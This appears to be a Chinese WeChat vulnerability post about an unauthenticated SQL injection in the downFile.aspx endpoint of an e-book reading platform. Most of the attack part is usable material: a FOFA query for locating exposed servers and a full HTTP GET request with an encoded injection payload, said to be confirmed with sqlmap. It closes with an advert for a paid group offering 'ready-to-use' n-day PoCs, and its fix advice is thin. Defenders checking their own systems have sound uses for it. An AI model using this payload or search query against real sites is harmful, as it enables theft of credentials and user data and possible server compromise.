#  电子图书阅读平台 downFile.aspx SQL注入漏洞   
Superhero  nday POC   2024-12-25 03:15  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
电子图书阅读平台为用户提供了一种便捷、环保且资源丰富的阅读方式,支持简单检索、二次检索、高级检索及全文检索；同时支持教育部、中图法两种分类浏览方式。支持在线阅读与离线下载阅读两种方式。在线阅读时，读者可实时在线打开电子教材进行翻阅，但部分教材有并发用户限制。下载阅读需下载至平台自带的独立阅读器打开，单本电子书每次下载使用期一般为30天，到期前可重新登录平台下载。  
**01******  
  
**漏洞概述**  
  
  
电子图书阅读平台 downFile.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="/Index.aspx/SearchBy"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcwQXreicg9FGoQI7gfkj5Na35MtSu4p1IAuyjbLIVmJJVG2CUZ1Mc6Rg/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVc0VZmzoRcsDic2sq66wfZJa9RIGKicynTvK2FTgY0nBfqIP390KHPNBEA/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcFzaRKDOada6bicMF2B6ONePn3micMlYmsEnwtW19uaH4uLxwwCKia4tCg/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcAf91cNPjDlvDsNb11l7hZ0HNhS2WGnKeFxFMGia4D8bVr7WRdicLECWA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcWqiaAqvwSU6O24m9tc10OgZv0ck4rvqZeJQQMibwWk1e6bExssd8R6hA/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcKaSx7C1UaUCECQQU1EASbKJIHxMNuarruYib8WYICor3ialj4WuY86Bw/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
对用户传入的参数进行限制  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
